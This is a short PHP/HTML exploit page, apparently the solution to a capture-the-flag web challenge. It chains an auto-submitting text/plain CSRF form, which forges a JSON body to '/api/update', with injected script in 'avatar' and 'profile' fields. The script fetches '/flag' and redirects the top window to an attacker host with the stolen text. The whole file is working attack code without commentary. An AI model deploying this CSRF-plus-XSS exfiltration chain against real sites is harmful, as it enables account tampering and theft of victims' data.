<?php include_once "config.php";

$script = "fetch('$target/flag').then(res => res.text()).then(text => top.location.assign('$back/?c='+text))";
$avatar = "( $script ))]/*";

$payload = "<script src=/export?format=markdown ></script>";
$payload = htmlentities($payload);
$profile = "<iframe srcdoc='$payload'></iframe> */";
?>

<form id="form" action="<?= $target ?>/api/update" method="POST" enctype="text/plain">
    <textarea name='{"":"'>","avatar":"<?= htmlentities($avatar) ?>","title":"","profile":"<?= htmlentities($profile) ?>"}</textarea>
</form>

<script>
form.submit();
</script>
